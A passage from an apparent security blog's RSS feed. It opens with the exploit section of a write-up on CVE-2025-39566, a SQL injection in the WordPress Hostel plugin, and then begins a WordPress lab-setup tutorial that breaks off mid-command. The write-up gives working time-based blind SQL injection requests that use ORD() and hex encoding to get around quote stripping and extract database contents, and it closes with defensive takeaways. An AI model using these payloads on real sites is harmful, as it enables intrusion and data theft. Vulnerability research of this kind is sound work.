&lt;strong&gt;inject SQL&lt;/strong&gt; directly.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detecting-sqli&#34;&gt;&lt;span&gt;Detecting SQLi&lt;/span&gt;&#xA;  &lt;a href=&#34;#detecting-sqli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Request with BurpSuite&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin.php?page=wphostel_bookings&amp;amp;type=upcoming&amp;amp;ob=tB.status,(SELECT&amp;#43;SLEEP(10))&amp;amp;dir=ASC HTTP/1.1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We separate the &lt;code&gt;ORDER BY&lt;/code&gt; clause with a comma because it accepts &lt;strong&gt;multi-column&lt;/strong&gt; values.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-21-cve-2025-39566/time_response.png&#34; title=&#34;Detecting SQLi&#34; data-thumbnail=&#34;/posts/2025-09-21-cve-2025-39566/time_response.png&#34; data-sub-html=&#34;&lt;h2&gt;time response&lt;/h2&gt;&lt;p&gt;Detecting SQLi&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-21-cve-2025-39566/time_response.png&#39; alt=&#34;time response&#34; height=&#34;259&#34; width=&#34;426&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Detecting SQLi&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Result: the response time is delayed → SQL Injection succeeded.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;dumping-data-from-the-database&#34;&gt;&lt;span&gt;Dumping Data from the Database&lt;/span&gt;&#xA;  &lt;a href=&#34;#dumping-data-from-the-database&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Bypass &lt;code&gt;&#39;&lt;/code&gt; using ORD()&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;To dump database data we need to extract characters such as the first character of the &lt;strong&gt;database name&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Because &lt;code&gt;sanitize_text_field()&lt;/code&gt; removes single quotes (&lt;code&gt;&#39;&lt;/code&gt;), we cannot use payloads relying on &lt;code&gt;&#39;&lt;/code&gt;. Instead, use &lt;code&gt;ORD()&lt;/code&gt; to compare character ASCII codes:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin.php?page=wphostel_bookings&amp;amp;type=past&amp;amp;ob=tB.status,(SELECT&amp;#43;IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))&amp;amp;dir=ASC HTTP/1.1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bypass succeeds → we can extract the database name.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-21-cve-2025-39566/ord_bypass.png&#34; title=&#34;Dumping Data from the Database&#34; data-thumbnail=&#34;/posts/2025-09-21-cve-2025-39566/ord_bypass.png&#34; data-sub-html=&#34;&lt;h2&gt;ORD bypass&lt;/h2&gt;&lt;p&gt;Dumping Data from the Database&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-21-cve-2025-39566/ord_bypass.png&#39; alt=&#34;ORD bypass&#34; height=&#34;287&#34; width=&#34;435&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Dumping Data from the Database&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bypass &lt;code&gt;&#39;&lt;/code&gt; using Hex encoding (alternative)&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Besides &lt;code&gt;ORD()&lt;/code&gt; we can use &lt;strong&gt;Hex encoding&lt;/strong&gt; to bypass:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin.php?page=wphostel_bookings&amp;amp;type=past&amp;amp;ob=tB.status,(SELECT&amp;#43;IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))&amp;amp;dir=ASC HTTP/1.1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bypass succeeds → database name can be extracted.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-21-cve-2025-39566/ord_bypass.png&#34; title=&#34;Bypass succeeds&#34; data-thumbnail=&#34;/posts/2025-09-21-cve-2025-39566/ord_bypass.png&#34; data-sub-html=&#34;&lt;h2&gt;Hex encoding bypass&lt;/h2&gt;&lt;p&gt;Bypass succeeds&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-21-cve-2025-39566/ord_bypass.png&#39; alt=&#34;Hex encoding bypass&#34; height=&#34;287&#34; width=&#34;435&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Bypass succeeds&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability &lt;strong&gt;CVE-2025-39566&lt;/strong&gt; in the WordPress &lt;strong&gt;Hostel&lt;/strong&gt; plugin (versions prior to &lt;strong&gt;1.1.5.7&lt;/strong&gt;) stems from inserting user-supplied input directly into an SQL query without adequate safeguards, leading to SQL Injection.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;sanitize_text_field()&lt;/code&gt; ≠ protection against &lt;strong&gt;SQL Injection&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Distinguish clearly between input cleaning for HTML contexts and validation/sanitization for SQL contexts&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection Cheat Sheet – PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/hostel/vulnerability/wordpress-hostel-1-1-5-6-sql-injection-vulnerability?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Hostel Plugin &amp;lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>WordPress Local and Debugging</title>
      <link>http://localhost:1313/posts/2025-08-21-wordpress-local-and-debugging/</link>
      <pubDate>Thu, 21 Aug 2025 09:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-08-21-wordpress-local-and-debugging/</guid>
      <category domain="http://localhost:1313/categories/web/">Web</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-08-21-wordpress-local-and-debugging/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;&lt;strong&gt;WordPress&lt;/strong&gt; is a powerful and the most popular content management system (CMS) that allows you to easily create, manage, and customize websites and blogs. It is an open-source CMS, built on PHP and using either MySQL or MariaDB.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Released in 2003, initially just for blogging, then evolved into a platform for building websites, online stores, forums, landing pages, etc.&lt;/li&gt;&#xA;&lt;li&gt;Today, more than 40% of websites worldwide run on WordPress.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;There are two versions of WordPress:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;WordPress.com&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Hosting service provided by Automattic&lt;/li&gt;&#xA;&lt;li&gt;You just register an account, no installation needed&lt;/li&gt;&#xA;&lt;li&gt;Limited customization; advanced features require payment&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;WordPress.org&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Open source, you download and install it on your own hosting/server&lt;/li&gt;&#xA;&lt;li&gt;Fully customizable: install plugins, themes, write code, and build any type of website&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;ecosystem&#34;&gt;&lt;span&gt;Ecosystem&lt;/span&gt;&#xA;  &lt;a href=&#34;#ecosystem&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Core&lt;/strong&gt;: the main CMS&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugins&lt;/strong&gt;: add-on software that extends WordPress functionality with new features&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Themes&lt;/strong&gt;: add-on software that defines the visual appearance and layout of a WordPress site&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;hr&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;why-wordpress-hacking&#34;&gt;&lt;span&gt;Why WordPress Hacking?&lt;/span&gt;&#xA;  &lt;a href=&#34;#why-wordpress-hacking&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/whitepaper/state-of-wordpress-security-in-2024&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;State of WordPress Security in 2024&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;most-popular&#34;&gt;&lt;span&gt;Most Popular&lt;/span&gt;&#xA;  &lt;a href=&#34;#most-popular&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;Currently, more than 40% of websites worldwide run on WordPress&lt;/li&gt;&#xA;&lt;li&gt;This means hackers only need to find one common vulnerability =&amp;gt; they can exploit millions of sites at once&lt;/li&gt;&#xA;&lt;li&gt;Similar to the saying: &lt;em&gt;“fish where the fish are”&lt;/em&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;plugins-and-themes&#34;&gt;&lt;span&gt;Plugins and Themes&lt;/span&gt;&#xA;  &lt;a href=&#34;#plugins-and-themes&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;WordPress Core has been reviewed for a long time by thousands of &lt;strong&gt;developers&lt;/strong&gt; and &lt;strong&gt;researchers&lt;/strong&gt;, making it very difficult for attackers to compromise directly.&lt;/li&gt;&#xA;&lt;li&gt;However, there are tens of thousands of plugins and themes from various sources with inconsistent quality.&lt;/li&gt;&#xA;&lt;li&gt;Many plugins have poor security coding and are outdated. Hackers just need to scan for outdated versions and exploit them.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;hr&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;setup-wordpress-for-hacking&#34;&gt;&lt;span&gt;Setup WordPress for Hacking&lt;/span&gt;&#xA;  &lt;a href=&#34;#setup-wordpress-for-hacking&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;There are many ways to set up WordPress; searching &lt;strong&gt;Google&lt;/strong&gt; will provide plenty of guides. Here I will set it up on an &lt;strong&gt;Ubuntu (22.04)&lt;/strong&gt; virtual machine:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Does not affect real machine services&lt;/li&gt;&#xA;&lt;li&gt;WordPress is relatively lightweight and works well on a VM&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;install-and-configure-wordpress&#34;&gt;&lt;span&gt;Install and Configure WordPress&lt;/span&gt;&#xA;  &lt;a href=&#34;#install-and-configure-wordpress&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;install-dependencies&#34;&gt;&lt;span&gt;Install Dependencies&lt;/span&gt;&#xA;  &lt;a href=&#34;#install-dependencies&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Install the full stack required to run WordPress (web server + database + PHP + important extensions):&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt install -y apache2 \&#xA;                 ghostscript \&#xA;                 libapache2-mod-php \&#xA;                 mysql-server \&#xA;                 php \&#xA;                 php-bcmath \&#xA;                 php-curl \&#xA;                 php-imagick \&#xA;                 php-intl \&#xA;                 php-json \&#xA;                 php-mbstring \&#xA;                 php-mysql \&#xA;                 php-xml \&#xA;                 php-zip&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;install-wordpress&#34;&gt;&lt;span&gt;Install WordPress&lt;/span&gt;&#xA;  &lt;a href=&#34;#install-wordpress&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Download and install WordPress source into the web directory:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;# Create folder to store site source code&#xA;sudo mkdir -p /srv/www&#xA;&#xA;# Change ownership to www-data (default user for Apache/Nginx)&#xA;sudo chown www-data: /srv/www&#xA;&#xA;# Download the latest WordPress package and extract it into 